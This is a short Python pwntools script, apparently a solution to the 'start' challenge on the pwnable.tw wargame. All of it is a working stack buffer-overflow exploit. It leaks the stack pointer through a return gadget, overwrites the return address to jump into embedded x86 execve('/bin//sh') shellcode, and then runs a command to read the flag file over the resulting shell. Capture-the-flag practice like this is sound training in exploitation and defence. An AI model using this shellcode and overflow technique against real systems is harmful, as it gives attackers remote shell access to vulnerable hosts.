from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
s = remote("chall.pwnable.tw", 10000)
_ = s.recv()
padding = "a"*20
cxsp = 0x08048087
s.send(padding + p32(cxsp))
esp = u32(s.recv()[:4])
payload = padding + p32(esp+20) + shellcode
s.send(payload)
s.send("cat /home/start/flag\n")
print s.recv()
s.close()
